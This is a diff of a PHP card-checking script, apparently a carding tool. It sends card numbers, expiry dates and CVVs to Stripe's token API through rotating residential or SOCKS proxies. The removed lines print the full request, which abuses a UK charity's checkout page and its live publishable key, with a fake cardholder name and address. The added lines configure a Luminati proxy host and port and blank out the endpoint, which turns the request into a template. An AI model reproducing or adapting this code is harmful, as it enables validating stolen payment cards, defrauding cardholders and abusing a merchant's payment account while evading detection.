@@ -53,12 +53,15 @@ $phone = $matches1[1][0];
 preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
 $postcode = $matches1[1][0];
 
-/////using zones
+////////////////////////////===[Luminati Details]
+
 $username = 'Put Zone Username Here';
 $password = 'Put Zone Password Here';
-$port = '  ';
+$port = 22225;
 $session = mt_rand();
-$super_proxy = '  ';
+$super_proxy = 'zproxy.lum-superproxy.io';
+
+
 ////////////////////////////===[For Authorizing Cards]
 
 $ch = curl_init();
@@ -67,15 +70,15 @@ $ch = curl_init();
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 ////////=========Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens'); 
+curl_setopt($ch, CURLOPT_URL, ' '); 
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json', 
-'accept-encoding: gzip, deflate, br',
-'content-type: application/x-www-form-urlencoded',
-'origin: https://checkout.stripe.com',
-'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=ffb01a23-f4bc-739d-d2ed-7c87a1668ece',
+'accept: ', 
+'accept-encoding: ',
+'content-type: ',
+'origin: ',
+'referer: ',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site'));
 //'user-agent: #'));
@@ -85,7 +88,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$first.'02@gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.saylaniwelfareuk.com%2Fasp-products%2Fqurbani-goat-sheep%2F&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=KRUTIK+RAUT&card[address_line1]=Christopher+StreetCoastal+Highway&card[address_city]=New+York&card[address_state]=NY&card[address_zip]=10080&card[address_country]=United+States&time_on_page=12413&guid=d24337f1-84fd-48fc-ad7e-41f8eff70621&muid=c4a75817-bd5b-432e-b0fd-69e7ca4ce286&sid=4b87bc05-b7a1-49e7-9a8d-9f5071fb3701&key=pk_live_OpsgDliPyiDg5rkI15it6JFX');
+curl_setopt($ch, CURLOPT_POSTFIELDS, ' ');
 
 $result = curl_exec($ch);
 /*$token = trim(strip_tags(getStr($result,'"id": "','"')));
@@ -98,7 +101,7 @@ $result = curl_exec($ch);
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 // ////////=========Socks Proxy
 // //curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, '');
+curl_setopt($ch, CURLOPT_URL, ' ');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -113,7 +116,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'Referer: ',
 'Sec-Fetch-Mode: cors',
 ));
-curl_setopt($ch, CURLOPT_POSTFIELDS, '   ');
+curl_setopt($ch, CURLOPT_POSTFIELDS, ' ');
 
 $result = curl_exec($ch);*/
 $message = trim(strip_tags(getStr($result,'"message":"','"'))); 
